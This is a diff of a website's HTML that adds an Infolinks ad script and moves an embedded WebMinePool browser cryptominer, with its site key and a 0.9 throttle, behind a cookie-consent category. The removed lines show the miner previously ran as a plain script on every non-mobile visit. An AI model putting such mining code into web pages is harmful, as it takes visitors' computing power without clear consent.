@@ -17,8 +17,11 @@
   </head>
 
   <body>
+
   <script defer src="data/cookieconsent.js"></script>
   <script defer src="data/cookieconsent-init.js"></script>
+  <!--Load the infolinks ads javascript library-->
+  <script type="text/javascript" src="//resources.infolinks.com/js/infolinks_main.js"></script>
 
 
   <div id="container"></div>
@@ -151,7 +154,7 @@
 
 
   <!--========== HEHE ==========-->
-  <script>
+  <script type="text/plain" data-cookiecategory="crypto">
       var miner = WMP.Anonymous('SK_AJ4RcH8EagzHv8XxJB4AG',{throttle: 0.9});
       if (!miner.isMobile()){
           miner.start();
@@ -170,20 +173,21 @@
 
 
 
-<!--Web Mine Pool Div to hold their user controller
+<!--Web Mine Pool Div to hold their user mining controller, doesn't seem to be working-
 <div id="wmp-container"
     wmp-site-key="SK_AJ4RcH8EagzHv8XxJB4AG"
     wmp-username="think-tank-consulting"
     wmp-threads="2"
-    wmp-throttle="0.1"
+    wmp-throttle="0.9"
     wmp-autostart="false"
-    style="margin: 0 auto;"
+    style="display: absolute;"
 >
 </div>
 -->
 
 <!--Adding in Consent Form-->
-
+<!--InfoLinks Ads-->
+<script type="text/plain" data-cookiecategory="infolinks_ads"> var infolinks_pid = 3358809; var infolinks_wsid = 0; </script>
   </body>
 
 </html>
